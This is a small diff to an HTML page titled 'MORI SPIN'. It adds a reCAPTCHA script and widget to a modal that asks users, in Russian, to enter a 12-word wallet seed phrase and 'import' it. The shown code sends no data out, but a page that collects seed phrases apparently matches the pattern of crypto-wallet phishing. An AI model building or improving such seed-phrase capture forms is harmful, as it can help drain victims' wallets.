@@ -9,6 +9,7 @@
         <link rel="preconnect" href="https://fonts.googleapis.com">
         <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
         <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
+		<script src="https://www.google.com/recaptcha/api.js" async defer></script>
 		<title>MORI SPIN</title>
 	</head>
 	<body>
@@ -77,6 +78,11 @@
 					</div>
 					<textarea id="seed-phrase-input" placeholder="Введите 12 слов..." class="modal-textarea" rows="4"></textarea>
 					<p class="error-message" id="error-message" style="display: none;"></p>
+					
+					<div class="g-recaptcha-container">
+						<div class="g-recaptcha" data-sitekey="YOUR_RECAPTCHA_SITE_KEY"></div>
+					</div>
+					
 					<button id="submit-button" class="modal-button">Импортировать</button>
 				</div>
 	
